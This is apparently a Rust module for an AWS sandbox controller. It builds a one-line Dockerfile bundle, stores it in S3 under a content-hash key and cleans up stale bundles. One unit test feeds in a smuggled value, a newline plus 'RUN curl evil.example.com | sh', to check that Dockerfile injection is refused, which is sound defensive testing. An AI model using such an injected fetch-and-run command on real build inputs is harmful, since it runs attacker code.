//! The bundle a Live AWS sandbox's MicroVM image is built from, rendered by its own controller.
//!
//! `CreateMicrovmImage` builds from a zip holding a Dockerfile, read from S3 in the image's own
//! region. The release's image already carries the agent, its contract and the original command,
//! so the Dockerfile is one `FROM` line. It is written to the deployment's bundle Storage, which
//! setup creates; this controller only writes and deletes its own keys there.

use std::io::Write;

use alien_aws_clients::s3::{ObjectIdentifier, PutObjectRequest, S3Api};
use alien_core::sandbox_build_role::SANDBOX_BUNDLE_KEY_PREFIX;
use alien_error::{AlienError, Context, IntoAlienError};
use sha2::{Digest, Sha256};
use tracing::info;
use zip::write::SimpleFileOptions;
use zip::ZipWriter;

use crate::error::{ErrorData, Result};

/// A rendered bundle and where it goes.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct RenderedBundle {
    pub(crate) bucket: String,
    /// `sandbox-bundle/<sandbox id>/<sha256 of the zip>/bundle.zip`: a release that changes nothing
    /// renders the same bytes, so the same key, and so no rebuild. The Storage is shared by the
    /// deployment's sandboxes, so each keeps to its own prefix and deletes only there.
    pub(crate) key: String,
    pub(crate) zip: Vec<u8>,
}

impl RenderedBundle {
    pub(crate) fn uri(&self) -> String {
        format!("s3://{}/{}", self.bucket, self.key)
    }
}

/// Renders the bundle that builds `image`.
pub(crate) fn render(bucket: &str, image: &str, resource_id: &str) -> Result<RenderedBundle> {
    // A newline in the reference would write Dockerfile directives of its own.
    if image.is_empty() || image.chars().any(|c| c.is_whitespace() || c.is_control()) {
        return Err(AlienError::new(ErrorData::ResourceConfigInvalid {
            message: format!(
                "sandbox image '{image}' is empty or carries whitespace or control characters"
            ),
            resource_id: Some(resource_id.to_string()),
        }));
    }
    let dockerfile = format!("FROM {image}\n");

    let failed = || ErrorData::ResourceConfigInvalid {
        message: "could not assemble the sandbox image bundle".to_string(),
        resource_id: Some(resource_id.to_string()),
    };
    let mut zip = ZipWriter::new(std::io::Cursor::new(Vec::new()));
    // A fixed timestamp keeps the bytes, and so the key, a function of the image alone. The
    // archive is flat: `CreateMicrovmImage` looks for the Dockerfile at its root.
    let options = SimpleFileOptions::default()
        .last_modified_time(zip::DateTime::default())
        .unix_permissions(0o644);
    zip.start_file("Dockerfile", options)
        .into_alien_error()
        .context(failed())?;
    zip.write_all(dockerfile.as_bytes())
        .into_alien_error()
        .context(failed())?;
    let zip = zip
        .finish()
        .into_alien_error()
        .context(failed())?
        .into_inner();

    Ok(RenderedBundle {
        bucket: bucket.to_string(),
        key: format!(
            "{}{:x}/bundle.zip",
            sandbox_prefix(resource_id),
            Sha256::digest(&zip)
        ),
        zip,
    })
}

/// The key prefix one sandbox's bundles are written under.
fn sandbox_prefix(resource_id: &str) -> String {
    format!("{SANDBOX_BUNDLE_KEY_PREFIX}/{resource_id}/")
}

/// Writes the bundle, then deletes this sandbox's other bundles except `serving`, the one its
/// active image was built from.
pub(crate) async fn write(
    client: &dyn S3Api,
    bundle: &RenderedBundle,
    serving: Option<&str>,
    resource_id: &str,
) -> Result<()> {
    client
        .put_object(&PutObjectRequest {
            bucket: bundle.bucket.clone(),
            key: bundle.key.clone(),
            body: bundle.zip.clone(),
            content_type: Some("application/zip".to_string()),
            content_md5: None,
            server_side_encryption: None,
            storage_class: None,
        })
        .await
        .context(ErrorData::CloudPlatformError {
            message: format!("Failed to write the sandbox bundle '{}'", bundle.uri()),
            resource_id: Some(resource_id.to_string()),
        })?;
    let serving = serving.and_then(|uri| uri.strip_prefix(&format!("s3://{}/", bundle.bucket)));
    delete_keys(client, &bundle.bucket, resource_id, |key| {
        key != bundle.key && Some(key) != serving
    })
    .await
}

/// Deletes every bundle this sandbox wrote, once nothing can build from them.
pub(crate) async fn delete_all(client: &dyn S3Api, bucket: &str, resource_id: &str) -> Result<()> {
    delete_keys(client, bucket, resource_id, |_| true).await
}

async fn delete_keys(
    client: &dyn S3Api,
    bucket: &str,
    resource_id: &str,
    stale: impl Fn(&str) -> bool,
) -> Result<()> {
    let failed = || ErrorData::CloudPlatformError {
        message: format!("Failed to delete stale sandbox bundles from '{bucket}'"),
        resource_id: Some(resource_id.to_string()),
    };
    let mut continuation = None;
    loop {
        let page = match client
            .list_objects_v2(bucket, Some(sandbox_prefix(resource_id)), continuation)
            .await
        {
            Ok(page) => page,
            // A bucket that is already gone holds no bundles.
            Err(error)
                if matches!(
                    error.error,
                    Some(alien_client_core::ErrorData::RemoteResourceNotFound { .. })
                ) =>
            {
                return Ok(());
            }
            Err(error) => return Err(error).context(failed()),
        };
        let keys = page
            .contents
            .into_iter()
            .filter(|object| stale(&object.key))
            .map(|object| ObjectIdentifier {
                key: object.key,
                version_id: None,
            })
            .collect::<Vec<_>>();
        if !keys.is_empty() {
            let deleted = client
                .delete_objects(bucket, &keys, true)
                .await
                .context(failed())?;
            if let Some(error) = deleted.errors.first() {
                return Err(AlienError::new(ErrorData::CloudPlatformError {
                    message: format!(
                        "Failed to delete the sandbox bundle '{}' from '{bucket}': {}",
                        error.key, error.message
                    ),
                    resource_id: Some(resource_id.to_string()),
                }));
            }
            info!(sandbox_id = %resource_id, %bucket, count = keys.len(), "Deleted stale sandbox bundles");
        }
        match page.next_continuation_token.filter(|_| page.is_truncated) {
            Some(token) => continuation = Some(token),
            None => return Ok(()),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn dockerfile(bundle: &RenderedBundle) -> String {
        let mut archive =
            zip::ZipArchive::new(std::io::Cursor::new(&bundle.zip)).expect("a zip archive");
        assert_eq!(archive.len(), 1, "the archive holds the Dockerfile alone");
        let mut contents = String::new();
        std::io::Read::read_to_string(
            &mut archive.by_name("Dockerfile").expect("at the root"),
            &mut contents,
        )
        .expect("reads");
        contents
    }

    /// The key is the content's digest: the same image renders the same key, so an unchanged
    /// release rebuilds nothing, and a new image (a new agent or a new base) renders a new one.
    #[test]
    fn the_key_follows_the_image_and_nothing_else() {
        let image = "123456789012.dkr.ecr.us-east-1.amazonaws.com/acme/agents@sha256:aaaa";
        let first = render("p-sandbox-bundles", image, "agents").unwrap();
        let again = render("p-sandbox-bundles", image, "agents").unwrap();
        let next = render(
            "p-sandbox-bundles",
            "123456789012.dkr.ecr.us-east-1.amazonaws.com/acme/agents@sha256:bbbb",
            "agents",
        )
        .unwrap();

        assert_eq!(first, again);
        assert_ne!(first.key, next.key);
        assert!(first.key.starts_with("sandbox-bundle/agents/"));
        assert_eq!(dockerfile(&first), format!("FROM {image}\n"));
    }

    /// Teardown can reach a sandbox whose bundle bucket is already gone; that leaves nothing to
    /// delete, while any other failure to list still stops the delete.
    #[tokio::test]
    async fn deleting_from_a_missing_bucket_succeeds_and_other_failures_do_not() {
        use alien_aws_clients::s3::MockS3Api;
        use alien_client_core::ErrorData as CloudError;

        let mut gone = MockS3Api::new();
        gone.expect_list_objects_v2()
            .times(1)
            .returning(|bucket, _, _| {
                Err(AlienError::new(CloudError::RemoteResourceNotFound {
                    resource_type: "Bucket".into(),
                    resource_name: bucket.to_string(),
                }))
            });
        gone.expect_delete_objects().never();
        delete_all(&gone, "p-sandbox-bundles", "agents")
            .await
            .expect("a missing bucket holds no bundles");

        let mut denied = MockS3Api::new();
        denied
            .expect_list_objects_v2()
            .times(1)
            .returning(|bucket, _, _| {
                Err(AlienError::new(CloudError::RemoteAccessDenied {
                    resource_type: "Bucket".into(),
                    resource_name: bucket.to_string(),
                }))
            });
        delete_all(&denied, "p-sandbox-bundles", "agents")
            .await
            .expect_err("a bucket that cannot be listed may still hold bundles");
    }

    #[test]
    fn a_reference_that_would_write_directives_is_refused() {
        for image in [
            "",
            "alpine\nRUN curl evil.example.com | sh",
            "alpine latest",
        ] {
            render("p-sandbox-bundles", image, "agents")
                .expect_err(&format!("{image:?} must not reach a Dockerfile"));
        }
    }
}
